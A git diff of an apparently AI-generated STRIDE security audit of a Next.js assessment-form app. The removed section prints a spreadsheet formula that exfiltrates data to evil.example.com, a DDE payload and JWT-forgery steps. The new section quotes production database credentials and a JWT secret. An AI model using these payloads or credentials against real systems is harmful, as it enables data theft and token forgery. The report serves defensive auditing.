@@ -1,146 +1,248 @@
-# Security Report — Express: assessmentform-express-spa-multi-step-as
+# SECURITY AUDIT REPORT
 
-**Mode:** retroactive
-**Audited:** 2026-08-11
-**Verdict:** OPEN_THREATS
-**Confirmed HIGH/CRITICAL:** 6
-
----
-
-## Summary
-
-Audited the full implementation of the Multi-Step Assessment Form SPA (Next.js 16 + PostgreSQL + Drizzle ORM), covering 14 API route handlers, 7 auth/middleware files, 10 service/DB-layer files, schema and migrations, and client-side auth guards. The codebase has solid foundations: Drizzle ORM with parameterized queries throughout (no raw SQL injection), Zod body validation on all mutation routes, and a dual-layer ownership check (middleware + service layer) on respondent endpoints. However, six confirmed HIGH or CRITICAL issues were found that require remediation before production: (1) production database credentials and the JWT secret are committed to git in `.env.local`; (2) the `/api/notifications/email` endpoint is publicly callable with no authentication, enabling email-relay abuse; (3) JWT algorithm is not pinned in two of three `jwtVerify` call sites, leaving an algorithm-confusion vector; (4) no rate limiting exists on `/api/auth/login` or `/api/sessions`, enabling brute-force and session-flooding; (5) CSV export does not neutralize formula-injection prefixes in free-text answers; (6) `NODE_TLS_REJECT_UNAUTHORIZED=0` is exported in `scripts/start.sh`, disabling TLS verification for all outbound connections at runtime. Additionally, three MEDIUM findings are noted. **No-ship in current state** — at minimum the committed secrets must be rotated and the email notification endpoint must be gated before deployment to production.
-
----
-
-## Attack surface audited
-
-| Area | STRIDE | Verdict | Evidence (file:line) |
-|------|--------|---------|----------------------|
-| POST /api/auth/login — email-only SO login, issues 8h JWT | Spoofing, DoS | CONFIRMED — no rate limiting | `src/app/api/auth/login/route.ts:14` |
-| POST /api/sessions — respondent session create/resume | DoS, Spoofing | CONFIRMED — no rate limiting | `src/app/api/sessions/route.ts:32` |
-| GET /api/sessions/:sessionId — session resume with ownership check | IDOR | REFUTED — dual check (requireSessionOwner + service layer) | `src/app/api/sessions/[sessionId]/route.ts:42`, `src/lib/session/sessionService.ts:201` |
-| PUT /api/responses/:sessionId — auto-save with Zod validation | Tampering | REFUTED — assessmentOpenGuard + requireSessionOwner + Zod | `src/app/api/responses/[sessionId]/route.ts:36–66` |
-| POST /api/submissions/:sessionId — finalize submission | Tampering, EoP | REFUTED — requireSessionOwner blocks SO, assessmentOpenGuard enforces due date | `src/app/api/submissions/[sessionId]/route.ts:35–42` |
-| GET /api/sections + GET /api/sections/:sectionId/questions | Information Disclosure | REFUTED — jwtMiddleware gates both; section content is non-sensitive | `src/app/api/sections/route.ts:46`, `src/app/api/sections/[sectionId]/questions/route.ts:47` |
-| GET/PATCH /api/config — config read/write | EoP, Tampering | REFUTED — requireSystemOwner enforced | `src/app/api/config/route.ts:9,34` |
-| GET /api/dashboard/** (responses, analytics, CSV) | EoP, Information Disclosure | REFUTED — requireSystemOwner enforced on all routes | `src/app/api/dashboard/responses/route.ts:8`, `analytics/route.ts:8`, `export/csv/route.ts:9`, `responses/[sessionId]/route.ts:11` |
-| POST /api/notifications/email — email relay trigger | EoP, DoS, Spoofing | CONFIRMED — no auth at all | `src/app/api/notifications/email/route.ts:25` |
-| GET /api/health — DB connectivity probe | Information Disclosure | LOW — unauthenticated by design; leaks DB connection status | `src/app/api/health/route.ts:9` |
-| JWT signing/verification — HS256, jose library | Spoofing | CONFIRMED — algorithm not pinned in 2 of 3 jwtVerify call sites | `src/lib/middleware/requireSessionOwner.ts:54`, `src/app/api/config/route.ts:61` |
-| .env.local committed to git — DB URL + JWT secret | Information Disclosure | CONFIRMED CRITICAL — real credentials in repo history | `d8ad63a` commit, `.env.local`, `.env.local.QUARANTINED-INCIDENT-20260722` |
-| CSV export — free-text answers embedded in CSV | Tampering | CONFIRMED — no formula-injection prefix neutralization | `src/lib/services/csvExportService.ts:13–34` |
-| dashboardService.ts — sortBy/sortDir parameters | Tampering (SQL injection) | REFUTED — allowlist map lookup, Drizzle ORM column reference | `src/lib/services/dashboardService.ts:59–67` |
-| dashboardService.ts — ilike search parameter | Tampering (SQL injection) | REFUTED — Drizzle ilike() parameterized; `%` wildcards expand but cannot inject SQL | `src/lib/services/dashboardService.ts:50–51` |
-| TLS verification — db.ts, drizzle.config.ts | Tampering | CONFIRMED MEDIUM — `rejectUnauthorized: false` in non-local mode | `src/lib/db.ts:24`, `drizzle.config.ts:13` |
-| NODE_TLS_REJECT_UNAUTHORIZED=0 in start.sh | Tampering | CONFIRMED HIGH — process-wide TLS disabled at runtime | `scripts/start.sh:7` |
-| JWT weak default in start.sh fallback | Spoofing | CONFIRMED MEDIUM — `uat-dev-secret-minimum-32-chars-here!!` used as fallback | `scripts/start.sh:18` |
-| XSS — user-controlled free-text rendered in React | Tampering | REFUTED — React auto-escapes text; no `dangerouslySetInnerHTML` found | N/A |
-| Client-side auth guard (dashboard AuthGuard.tsx) | Spoofing | REFUTED — client guard is UX-only; all dashboard APIs require server-side JWT | `src/components/dashboard/AuthGuard.tsx:29` (comment notes this explicitly) |
-| assessmentOpenGuard fail-open on DB error | Tampering | LOW — guard catches exceptions and returns `{ ok: true }`, allowing saves during DB errors | `src/lib/middleware/assessmentOpenGuard.ts:48–51` |
-| section_ids_ordered — attacker-controlled JSONB used in `ANY()` | Tampering | REFUTED — value comes from DB row (sessions.section_ids_ordered), not directly from request | `src/lib/services/dashboardService.ts:130`, `src/lib/services/analyticsService.ts:103` |
-| current_section_index — unbounded integer write | Tampering | LOW — validated `min(0)` by Zod, no max; DB column is integer so DB rejects overflow | `src/lib/schemas/answerPayload.ts:68` |
+| Field | Value |
+|-------|-------|
+| **Phase** | assessmentform-express-spa-multi-step-as (Full codebase — Waves 1–11) |
+| **Mode** | Retroactive (re-audit — state A) |
+| **Audited** | 2026-08-11 |
+| **Auditor** | claude-sonnet-4-6 (automated STRIDE audit) |
+| **Verdict** | **OPEN_THREATS** |
+| **threats_open** | 4 (2 CRITICAL, 1 HIGH, 1 MEDIUM) |
+| **threats_lower** | 4 (LOW/INFO) |
 
 ---
 
-## Confirmed findings
+## Re-audit Note (2026-08-11)
 
-### F-01: Production Secrets Committed to Git — CRITICAL
-- **Category:** secret_leak / information_disclosure
-- **Location:** `.env.local` (committed in commit `d8ad63a`), `.env.local.QUARANTINED-INCIDENT-20260722`
-- **Description:** The `.env.local` file containing the production PostgreSQL connection string (with username and password URL-encoded) and the JWT signing secret `q8Fv3nT6ZpW1YxRk9LmC2aD5sH7uQ4Jb0VgEoI+NtUf=` was committed to the git repository in commit `d8ad63a`. The file is **not** in `.gitignore` (`.gitignore` only ignores `.venv/` and `venv/`; it does not include `.env.local`). The quarantine copy confirms this is a known incident (file renamed with `QUARANTINED-INCIDENT-20260722` suffix) but the credential-containing files remain in git history and on disk.
-- **Exploit:** Anyone with read access to the git repository can extract the production DB password and JWT secret with `git show d8ad63a -- .env.local`. The DB password grants direct read/write to all respondent data. The JWT secret allows minting arbitrary tokens for any role (including `system_owner`) that will be accepted by all API endpoints.
-- **Fix:** (1) Rotate DB password and JWT secret immediately. (2) Purge the file from git history using `git filter-repo` or BFG. (3) Add `.env.local` and `.env*.local` patterns to `.gitignore`. (4) Verify the DB credentials in the quarantined file are no longer valid.
+**No implementation source code (`src/`) changed since the prior audit (commit `17af0de`).** All findings FIND-01 through FIND-08 are carried forward without modification — none have been mitigated.
 
----
+**New surface reviewed:** The `.pivota/` directory was added since the prior audit, containing three files:
 
-### F-02: Unauthenticated /api/notifications/email Endpoint — HIGH
-- **Category:** authz_bypass / spoofing / dos
-- **Location:** `src/app/api/notifications/email/route.ts:25`
-- **Description:** The `POST /api/notifications/email` endpoint is documented as "internal server-to-server only" but has **no authentication whatsoever**. Any unauthenticated HTTP client can call it with a valid-looking JSON body `{ session_id, email, name, due_date }` and trigger outbound email relay requests. The endpoint accepts any valid `email` string in the body — the `email` field is validated only as a string.email format, not checked against any session or ownership.
-- **Exploit:** An attacker sends: `POST /api/notifications/email` with body `{"session_id":"00000000-0000-0000-0000-000000000000","email":"victim@example.com","name":"Winner","due_date":"2026-12-31T00:00:00Z"}`. The server calls `sendSubmissionConfirmation()` which POSTs to `EMAIL_RELAY_URL` with the attacker-controlled `email` and `name`. This enables: (a) email spam/phishing to any address by looping through an email list; (b) SSRF if the attacker can influence the `EMAIL_RELAY_URL` via env manipulation; (c) DoS on the email relay by flooding requests.
-- **Fix:** (a) Short-term: add a shared secret header check (e.g. `X-Internal-Secret`) verified against an env var, or only call the email service directly (not via HTTP) since `submissionService.ts` already calls `sendSubmissionConfirmation` directly without going through the HTTP route. (b) Remove the HTTP endpoint entirely and rely only on the direct function call already present in `src/app/api/submissions/[sessionId]/route.ts:58`.
+| File | Type | Verdict |
+|------|------|---------|
+| `.pivota/start-dev.sh` | Bash dev-server launcher | **SAFE** — all shell variables are hardcoded or derived from the local filesystem; no external user input flows into shell execution; `.env.example` seeding uses `printf`/parameter expansion only (no `eval`); `CHANGE_ME` replacement uses `/dev/urandom | base64` (safe CSPRNG). |
+| `.pivota/uat-start.sh` | Bash UAT launcher | **SAFE** — `PORT` and `COMPOSE` env vars are operator-controlled sandbox environment, not external user input; `RUN_CMD` is set to one of two hardcoded strings before `bash -c`; no injection path from outside the sandbox operator. |
+| `.pivota/dev-script.meta.json` | Generated metadata (JSON) | **SAFE** — static metadata only; never executed. |
+
+**Verdict unchanged: OPEN_THREATS (4 open findings: 2 CRITICAL, 1 HIGH, 1 MEDIUM).**
 
 ---
 
-### F-03: JWT Algorithm Not Pinned in Two jwtVerify Call Sites — HIGH
-- **Category:** spoofing / auth_bypass
-- **Location:** `src/lib/middleware/requireSessionOwner.ts:54`, `src/app/api/config/route.ts:61`
-- **Description:** `verifyJwt()` in `authService.ts` correctly pins `{ algorithms: ['HS256'] }` (line 31). However, there are two additional raw `jwtVerify` calls that **do not** specify the `algorithms` option:
-  - `requireSessionOwner.ts:54`: `await jwtVerify(token, secret)` — used for `PUT /api/responses/:sessionId` and `POST /api/submissions/:sessionId`
-  - `config/route.ts:61`: `await jwtVerify(token, secret)` — used for the belt-and-suspenders email extraction in `PATCH /api/config`
-  With `jose`, omitting `algorithms` means the library uses any algorithm the JWT header claims. If an attacker crafts a JWT with `alg: "none"` and a specially formed signature, or if a future `jose` version changes defaults, these endpoints could accept tokens without signature verification.
-- **Exploit:** Craft a JWT with header `{"alg":"none","typ":"JWT"}`, payload `{"email":"attacker@x.com","role":"system_owner"}`, and empty signature. Send to `PUT /api/responses/<any-session-id>`. The `requireSessionOwner.ts` middleware would accept the unsigned token (depending on jose version behavior with `alg:none`). Note: current jose versions may reject `none` by default, but the missing pin is still a structural vulnerability if the library's default behavior changes or is misconfigured.
-- **Fix:** Add `{ algorithms: ['HS256'] }` to both raw `jwtVerify` calls at `requireSessionOwner.ts:54` and `config/route.ts:61`. Better yet, route all JWT verification through the central `verifyJwt()` function in `authService.ts`.
+## 1. Attack Surface (STRIDE Register)
+
+| ID | Area | Route / File | STRIDE | Initial Disposition |
+|----|------|-------------|--------|-------------------|
+| S1 | JWT signing (authService) | `src/lib/auth/authService.ts` | Spoofing | SAFE — HS256 pinned in `verifyJwt`, jose rejects `none` alg by design |
+| S2 | JWT verify without alg pin | `src/lib/middleware/requireSessionOwner.ts:54` | Spoofing | LOW — `none` rejected by jose; no practical downgrade path with symmetric key |
+| S3 | JWT storage in localStorage | `src/app/dashboard/login/page.tsx`, `src/hooks/*` | Spoofing | ACCEPTED RISK — XSS-exposed but no HttpOnly cookie alternative in SPA |
+| T1 | Session-ownership check on PUT /api/responses | `src/app/api/responses/[sessionId]/route.ts` | Tampering | CONFIRMED MEDIUM — `assessmentOpenGuard` runs *before* auth; unauthenticated timing oracle |
+| T2 | Session-ownership check on GET /api/sessions | `src/app/api/sessions/[sessionId]/route.ts` | Tampering | SAFE — jwtMiddleware → requireSessionOwner (HOF) → service double-check |
+| T3 | IDOR on POST /api/submissions | `src/app/api/submissions/[sessionId]/route.ts` | Tampering | SAFE — requireSessionOwner (middleware) does full JWT + ownership verification |
+| T4 | Raw SQL in analyticsService | `src/lib/services/analyticsService.ts:91–168` | Tampering | SAFE — `q.id` sourced from DB rows, user input never flows into raw SQL |
+| T5 | LIKE wildcard injection in search | `src/lib/services/dashboardService.ts:50-51` | Tampering | LOW — causes table scan; no data disclosure; dashboard is system_owner–gated |
+| T6 | Input validation on answer payloads | `src/app/api/responses/[sessionId]/route.ts` | Tampering | SAFE — `PutResponsesBodySchema` (Zod) validated before DB write |
+| I1 | Secrets committed to git — `.env` | commit `a343e60` | Info Disclosure | CONFIRMED HIGH — JWT_SECRET + DB creds in `.env` committed to repo |
+| I2 | Secrets committed to git — `.env.local` | commit `a343e60` | Info Disclosure | CONFIRMED CRITICAL — production JWT_SECRET + production DATABASE_URL (with password) committed |
+| I3 | Secrets committed to git — `.env.local.QUARANTINED-INCIDENT-20260722` | commit `a343e60` | Info Disclosure | CONFIRMED CRITICAL — same production creds committed; "QUARANTINED" rename is cosmetic |
+| I4 | Hardcoded credentials in docker-compose.yml | `docker-compose.yml:9,31` | Info Disclosure | CONFIRMED MEDIUM — DB password + placeholder JWT_SECRET in committed Compose file |
+| I5 | TLS certificate verification disabled | `src/lib/db.ts:24`, `.env.local:5` | Info Disclosure | CONFIRMED HIGH — `rejectUnauthorized: false` for all non-local DB connections |
+| I6 | Unauthenticated email notification endpoint | `src/app/api/notifications/email/route.ts` | Info Disclosure / DoS | CONFIRMED MEDIUM — no auth guard; any client can trigger arbitrary emails |
+| I7 | JWT returned in API response body | `src/lib/session/sessionService.ts:153` | Info Disclosure | ACCEPTED RISK — design choice; SPA requires token; no server-side session store |
+| D1 | No rate limiting on login or session creation | `POST /api/auth/login`, `POST /api/sessions` | DoS | CONFIRMED LOW — brute-force email enumeration possible; no mitigation present |
+| D2 | CSV export loads all rows into memory | `src/lib/services/csvExportService.ts` | DoS | LOW — system_owner–gated; not externally exploitable |
+| E1 | System Owner role check on all /api/dashboard/* | All dashboard routes | Elevation | SAFE — `requireSystemOwner` (direct-await) applied on every handler |
+| E2 | System Owner bypass in HOF requireSessionOwner | `src/lib/auth/requireSessionOwner.ts:18` | Elevation | SAFE — service-level email match blocks cross-session read even after middleware bypass |
+| E3 | `assessmentOpenGuard` failure treated as open | `src/lib/middleware/assessmentOpenGuard.ts:48-51` | Elevation | LOW — DB error during guard → assessment treated as open, allowing saves/submissions |
+| P1 | `.pivota/start-dev.sh` — shell variable injection | `.pivota/start-dev.sh` | Tampering | SAFE — all variables hardcoded or filesystem-derived; no external user input in shell expansions |
+| P2 | `.pivota/uat-start.sh` — `$COMPOSE` env var in shell | `.pivota/uat-start.sh:19` | Tampering | SAFE — `$COMPOSE` is operator-controlled sandbox env; not externally user-controlled |
+| P3 | `.pivota/dev-script.meta.json` | `.pivota/dev-script.meta.json` | — | SAFE — static metadata only; never executed |
 
 ---
 
-### F-04: No Rate Limiting on /api/auth/login and /api/sessions — HIGH
-- **Category:** dos / brute_force
-- **Location:** `src/app/api/auth/login/route.ts:14`, `src/app/api/sessions/route.ts:32`
-- **Description:** Neither `POST /api/auth/login` (System Owner login) nor `POST /api/sessions` (respondent session creation) have any rate limiting, throttling, or CAPTCHA. The login endpoint performs a DB lookup for every request; the sessions endpoint does a DB lookup plus potential INSERT.
-- **Exploit (login):** An attacker scripts `POST /api/auth/login` with rotating emails to enumerate which emails are registered as System Owners (the error distinguishes `NOT_A_SYSTEM_OWNER` from auth success), then brute-forces the token if the JWT is email-only without a password. Since login requires only an email (magic-link style), a legitimate SO account can be taken over if the attacker knows the email, since the JWT is issued immediately on matching an active record — no password or TOTP required.
-- **Exploit (sessions):** An attacker can create unlimited sessions/respondent accounts, flooding the `respondents` and `sessions` tables without any barrier (only a DB UNIQUE constraint on email, but with rotating emails this is trivially bypassed).
-- **Fix:** Add IP-based rate limiting (e.g., `next-rate-limit`, Vercel Edge Middleware, or a reverse proxy rule): max 5 login attempts per IP per 15 minutes; max 10 session creates per IP per hour. Also consider exponential backoff and account lockout after repeated failures on `/api/auth/login`.
+## 2. Confirmed Findings
+
+### FIND-01 — Production Credentials Committed to Git (`.env.local`)
+| Field | Value |
+|-------|-------|
+| **ID** | FIND-01 |
+| **Severity** | CRITICAL |
+| **STRIDE** | Information Disclosure |
+| **Location** | `.env.local` committed in `a343e60`; `.env.local.QUARANTINED-INCIDENT-20260722` committed in same commit |
+| **CWE** | CWE-312 (Cleartext Storage of Sensitive Information) |
+| **Status** | UNMITIGATED (confirmed on re-audit 2026-08-11) |
+
+**Description:**  
+Commit `a343e60` includes `.env.local` containing the **production** `DATABASE_URL` with embedded credentials for `pivota-spec-driven-primary.prod.svc` and the production `JWT_SECRET`. A second file `.env.local.QUARANTINED-INCIDENT-20260722` (renamed copy) carries the same data. Both are tracked in git history permanently.
+
+**Evidence (committed content):**
+```
+DATABASE_URL=postgresql://pivota-spec-driven:%3EAhQ%7B-%5D%2FJCVAr%5BHR2%7BdH7YIr@pivota-spec-driven-primary.prod.svc:5432/pivota-spec-driven?sslmode=no-verify
+JWT_SECRET=q8Fv3nT6ZpW1YxRk9LmC2aD5sH7uQ4Jb0VgEoI+NtUf=
+```
+
+**Exploit:**  
+Anyone with read access to the git repository (including CI/CD tokens, forks, or git-log on clones already distributed) can extract the production database password and JWT signing secret. With the JWT secret, an attacker can forge tokens for any role (including `system_owner`) and sign arbitrary session ownership claims, gaining full access to all respondent data and the admin dashboard. With the database password, direct DB access bypasses all application-layer controls.
+
+**Fix:**
+1. **Immediately rotate** the production `JWT_SECRET` and database password—the secrets are already in git history.
+2. Remove `.env.local` and `.env.local.QUARANTINED-INCIDENT-20260722` from git tracking: `git rm --cached .env.local .env.local.QUARANTINED-INCIDENT-20260722`
+3. Add `*.env.local` and `.env.local*` patterns to `.gitignore` (currently absent).
+4. Use git-filter-repo or BFG Repo Cleaner to purge all references from history.
+5. Consider scanning CI/CD artifacts and any distributed clones.
 
 ---
 
-### F-05: CSV Formula Injection in Export — HIGH
-- **Category:** csv_injection / tampering
-- **Location:** `src/lib/services/csvExportService.ts:13–34` (`flattenAnswerPayload`)
-- **Description:** The CSV export renders free-text answers (`free_text_short`, `free_text_long`) verbatim via `String(p.value ?? '')` with no sanitization of formula injection prefixes. If a respondent submits an answer beginning with `=`, `+`, `-`, or `@`, spreadsheet applications (Excel, LibreOffice, Google Sheets) will interpret it as a formula when the CSV is opened. Although `csv-stringify` properly quotes fields containing commas and quotes, it does **not** prefix-neutralize formula characters.
-- **Exploit:** A respondent submits a free-text answer: `=HYPERLINK("https://evil.example.com/steal?data="&A2,"Click here")`. When a System Owner opens the exported CSV in Excel, this formula executes, exfiltrating spreadsheet data to the attacker-controlled server. Variants include `=CMD|' /C calc'!A0` (DDE injection on older Excel versions).
-- **Fix:** In `flattenAnswerPayload()`, for `free_text_short` and `free_text_long` cases, prefix-escape values that start with `=`, `+`, `-`, `@`, `\t`, or `\r` by prepending a single quote (`'`) or tab-character. Example: `const safe = /^[=+\-@\t\r]/.test(val) ? "'" + val : val`.
+### FIND-02 — Development JWT Secret and DB Password Committed to Git (`.env`)
+| Field | Value |
+|-------|-------|
+| **ID** | FIND-02 |
+| **Severity** | HIGH |
+| **STRIDE** | Information Disclosure |
+| **Location** | `.env` committed in `a343e60` |
+| **CWE** | CWE-312 |
+| **Status** | UNMITIGATED (confirmed on re-audit 2026-08-11) |
+
+**Description:**  
+The `.env` file (containing a UAT/dev `JWT_SECRET` and localhost DB credentials) was committed to git history in the same commit. Although lower-risk than production credentials, this secret is in public git history and could be used to forge JWTs in any environment that shares this secret, or to reconstruct dev DB access patterns.
+
+**Evidence:**
+```
+JWT_SECRET=uat-test-secret-32-chars-minimum-xxxxxxxx
+DATABASE_URL=postgres://assessmentform:assessmentform_dev_password@localhost:5432/assessmentform
+```
+
+**Exploit:**  
+Anyone with repo access can forge JWT tokens for any role using the `uat-test-secret` value, gaining system_owner access in any environment running that secret.
+
+**Fix:**
+1. Rotate the UAT/dev `JWT_SECRET`.
+2. Remove `.env` from git tracking: `git rm --cached .env`
+3. Add `.env` to `.gitignore` (currently the `.gitignore` ignores `.next/`, `node_modules/`, etc. but has **no `.env` or `.env.*` pattern**—this is the root cause).
+4. Use git-filter-repo to purge from history.
 
 ---
 
-### F-06: NODE_TLS_REJECT_UNAUTHORIZED=0 Exported in Production Start Script — HIGH
-- **Category:** tampering / information_disclosure
-- **Location:** `scripts/start.sh:7`
-- **Description:** The production startup script exports `NODE_TLS_REJECT_UNAUTHORIZED=0` as a **process-wide environment variable** before starting the Next.js server. This disables TLS certificate verification for **all** outbound HTTPS connections from the Node.js process, including connections to external services (email relay, any future third-party integrations). This is broader in scope than the scoped `rejectUnauthorized: false` in `db.ts` (which only affects the DB pool).
-- **Exploit:** A man-in-the-middle attacker on the network between the server and `EMAIL_RELAY_URL` (or any other HTTPS endpoint) can present a self-signed or invalid certificate and intercept all traffic — including email content containing respondent names, emails, and session IDs — without detection.
-- **Fix:** Remove `export NODE_TLS_REJECT_UNAUTHORIZED=0` from `scripts/start.sh`. If the database sidecar requires a self-signed cert, scope the TLS bypass to the DB connection only (already done in `db.ts`) rather than applying it process-wide. Configure `EMAIL_RELAY_URL` with a properly CA-signed certificate.
+### FIND-03 — TLS Certificate Verification Disabled for Production Database
+| Field | Value |
+|-------|-------|
+| **ID** | FIND-03 |
+| **Severity** | HIGH |
+| **STRIDE** | Information Disclosure / Tampering |
+| **Location** | `src/lib/db.ts:24`; `src/lib/db.ts:16-18` (isLocal detection); `.env.local:5` (`NODE_TLS_REJECT_UNAUTHORIZED=0`) |
+| **CWE** | CWE-295 (Improper Certificate Validation) |
+| **Status** | UNMITIGATED (confirmed on re-audit 2026-08-11 — `ssl: { rejectUnauthorized: false }` at db.ts:24) |
+
+**Description:**  
+The database connection pool sets `ssl: { rejectUnauthorized: false }` for all non-localhost connections (line 24 of `db.ts`). This means the application connects to the production PostgreSQL sidecar without verifying the server certificate, making it vulnerable to TLS MITM attacks. Additionally, `.env.local` sets `NODE_TLS_REJECT_UNAUTHORIZED=0`, which disables Node.js's TLS verification globally for the process, affecting all outbound HTTPS connections (including email relay calls via `fetch()`).
+
+**Evidence:**
+```typescript
+// src/lib/db.ts:24
+ssl: isLocal ? false : { rejectUnauthorized: false },
+```
+```
+# .env.local:5
+NODE_TLS_REJECT_UNAUTHORIZED=0
+```
+
+**Exploit:**  
+A network-level attacker between the app container and the database sidecar can perform a MITM attack to intercept all DB queries (reading all respondent data, emails, answers) or inject malicious responses. The process-level TLS bypass also allows MITM on the email relay connection.
+
+**Fix:**
+1. Change to `ssl: { rejectUnauthorized: true }` and provide the correct CA certificate via `ca: fs.readFileSync('/path/to/ca.crt')` or equivalent.
+2. Remove `NODE_TLS_REJECT_UNAUTHORIZED=0` from `.env.local` and `scripts/start.sh`.
+3. If using the platform sidecar with a self-signed cert, provision the sidecar CA cert and pin it explicitly rather than disabling verification entirely.
 
 ---
 
-## Medium / Lower Severity Findings
+### FIND-04 — Unauthenticated Email Notification Endpoint
+| Field | Value |
+|-------|-------|
+| **ID** | FIND-04 |
+| **Severity** | MEDIUM |
+| **STRIDE** | Elevation of Privilege / Denial of Service |
+| **Location** | `src/app/api/notifications/email/route.ts` |
+| **CWE** | CWE-306 (Missing Authentication for Critical Function) |
+| **Status** | UNMITIGATED (confirmed on re-audit 2026-08-11 — no auth import or guard present in route.ts) |
 
-### F-07: Weak JWT Fallback Secret in start.sh — MEDIUM
-- **Category:** secret_leak / weak_secret
-- **Location:** `scripts/start.sh:18`
-- **Description:** When `JWT_SECRET` is not found in PID1 env, the script falls back to the hardcoded value `uat-dev-secret-minimum-32-chars-here!!`. If the platform fails to inject `JWT_SECRET` (e.g., due to misconfiguration), the app silently starts with this well-known secret visible in the public repository. Any attacker who reads the start script can forge valid JWTs for any role.
-- **Fix:** Remove the fallback value. Instead, fail fast: `JWT="${JWT:-${JWT_SECRET:?JWT_SECRET is required}}"` — this causes the script to exit with an error rather than silently starting with a weak secret.
+**Description:**  
+`POST /api/notifications/email` is publicly accessible with no authentication guard. Although documented as "internal server-to-server only," it is a standard HTTP endpoint reachable from the internet. It accepts a Zod-validated schema `{ session_id: UUID, email: string, name: string, due_date: string }` and forwards the call to `sendSubmissionConfirmation()`, which POSTs to the configured `EMAIL_RELAY_URL`. Any unauthenticated attacker can:
 
----
+1. Trigger arbitrary email sends to any email address they supply.
+2. Use it to spam, phish, or impersonate the assessment platform.
+3. Enumerate whether `EMAIL_RELAY_URL` is configured (200 vs. network error patterns).
 
-### F-08: TLS Certificate Verification Disabled for DB and Config Tool — MEDIUM
-- **Category:** tampering / information_disclosure
-- **Location:** `src/lib/db.ts:24`, `drizzle.config.ts:13`
-- **Description:** Both the runtime DB pool and the Drizzle migration tool use `ssl: { rejectUnauthorized: false }` for non-local connections. While this is scoped to DB connections only (unlike F-06 which is process-wide), it allows MITM attacks on the database wire protocol, potentially exposing all respondent data and credentials.
-- **Fix:** Provision a valid CA certificate for the database sidecar and set `ssl: { rejectUnauthorized: true, ca: fs.readFileSync('/path/to/ca.pem') }`, or use `sslmode=verify-full` in the connection string.
+**Refutation check:** Is the endpoint rate-limited or IP-restricted at infrastructure level? No rate limiting is present in the codebase, and no NGINX/WAF config is included. The endpoint is fully exposed.
 
----
+**Evidence:**
+```typescript
+// route.ts — no auth check before processing
+export async function POST(request: NextRequest) {
+  // ... parse body, call sendSubmissionConfirmation()
+}
+```
 
-### F-09: assessmentOpenGuard Fails Open on DB Error — LOW
-- **Category:** tampering / guard_bypass
-- **Location:** `src/lib/middleware/assessmentOpenGuard.ts:48–51`
-- **Description:** The `assessmentOpenGuard` catches all exceptions and returns `{ ok: true }` (treating the assessment as open). If the `assessment_config` table is temporarily unavailable or the query times out, the guard silently permits saves and submissions even if the assessment is closed. This could allow post-deadline submissions during a DB outage window.
-- **Fix:** Consider failing closed (return `ASSESSMENT_CLOSED`) when the config cannot be read, unless the intended design is to allow saves during DB hiccups. At minimum, log a warning with the error so operators know the guard was bypassed.
-
----
-
-## Accepted risks
-
-| ID | Risk | Why accepted | Owner |
-|----|------|--------------|-------|
-| R-01 | `/api/health` leaks DB connectivity status (connected/disconnected) to unauthenticated callers | Required for container healthchecks and monitoring; status leaks are operationally necessary. Impact is low — no sensitive data exposed. | Infra / Ops |
-| R-02 | `current_section_index` has no upper-bound validation at API layer (only `min(0)`) | Upper bound is implicitly enforced by the DB integer column type (max 2,147,483,647); no known exploit path — the value is informational only and triggers no conditional logic that could be abused. | Dev team |
-| R-03 | `ilike` wildcard search (`%term%`) in dashboard/CSV allows potentially slow queries on large datasets | An authenticated System Owner is the only caller. Mitigated by `pageSize` cap of 100. True DoS would require SO credentials. | Dev team |
+**Fix:**
+1. Add `requireSystemOwner` (or a shared internal secret header check) to the route handler, or
+2. Remove the HTTP endpoint entirely—`sendSubmissionConfirmation()` is already called directly from `submissionService.ts` (server-side), so the HTTP route is redundant and unnecessary.
+3. If the HTTP route is retained for architectural reasons, add a pre-shared secret check: `if (req.headers.get('X-Internal-Token') !== process.env.INTERNAL_EMAIL_SECRET) return 401`.
 
 ---
 
-## Audit trail
-- **Diff scoped via:** entire develop branch implementation files (all files listed in required reading; no main branch exists)
-- **Register:** built retroactively from implementation diff (retroactive STRIDE mode)
-- **Refutation:** 23 candidates examined, 9 confirmed (6 HIGH/CRITICAL + 3 MEDIUM/LOW), 14 refuted as safe
-- **Key safe findings refuted:** SQL injection via sortBy (allowlist map, no raw string interpolation); SQL injection via search (Drizzle ilike() parameterized); IDOR on session endpoints (dual-layer ownership check confirmed in both middleware and service layer); XSS via free-text (React JSX auto-escaping, no dangerouslySetInnerHTML); CSV sort/filter injection (Drizzle column references, not string interpolation)
+## 3. Lower-Severity Findings
+
+| ID | Severity | Title | Location | Notes |
+|----|----------|-------|----------|-------|
+| FIND-05 | LOW | No rate limiting on login / session creation | `POST /api/auth/login`, `POST /api/sessions` | Allows email enumeration (different error codes for SO vs non-SO) and brute-force session creation. Recommend upstream rate limiter (nginx, Cloudflare, or `express-rate-limit` wrapper). |
+| FIND-06 | LOW | `assessmentOpenGuard` failure treated as open | `src/lib/middleware/assessmentOpenGuard.ts:48-51` | A DB error during the guard silently allows saves/submissions after the due date. Should fail closed: return 503 SERVICE_UNAVAILABLE rather than `{ ok: true }`. |
+| FIND-07 | LOW | `jwtVerify` without explicit algorithm pin in `requireSessionOwner` middleware | `src/lib/middleware/requireSessionOwner.ts:54` | Does not pass `{ algorithms: ['HS256'] }` unlike `authService.verifyJwt`. Currently safe because jose v6.2.3 rejects `alg:none` with symmetric keys; however explicit pinning is a defense-in-depth practice. |
+| FIND-08 | LOW | Missing `.gitignore` patterns for `.env` files | `.gitignore` | The managed `.gitignore` block contains no `**/.env*` pattern. This is the root cause of FIND-01 and FIND-02. Add `.env`, `.env.local`, `.env.*.local`, `.env.local.*` exclusions. |
+
+---
+
+## 4. Accepted Risks
+
+| ID | Area | Rationale |
+|----|------|-----------|
+| AR-01 | JWT stored in localStorage | Design constraint: SPA with no server-side session store. XSS risk mitigated by Next.js Content Security Policy defaults and React's automatic HTML escaping. Tokens are short-lived (8h/24h). |
+| AR-02 | LIKE wildcard injection in `search` parameter | `ilike()` in Drizzle uses parameterized queries; wildcards in user search string cause full-table scans but no data leakage. Route is system_owner–gated. Acceptable for current data volume. |
+| AR-03 | CSV export reads all rows into memory | System_owner–gated. Current data scale (assessment cohort) is bounded. Stream-to-disk refactor can be done if scale grows. |
+| AR-04 | `docker-compose.yml` has hardcoded DB password | Development-only compose file. The `docker-compose.yml` JWT_SECRET is a placeholder with a comment to replace it. DB password `assessmentform_dev_password` is non-reusable and clearly dev-scoped. Still tracked in git—acceptable for dev tooling. |
+
+---
+
+## 5. Audit Trail
+
+| Step | Finding | Evidence Checked | Result |
+|------|---------|-----------------|--------|
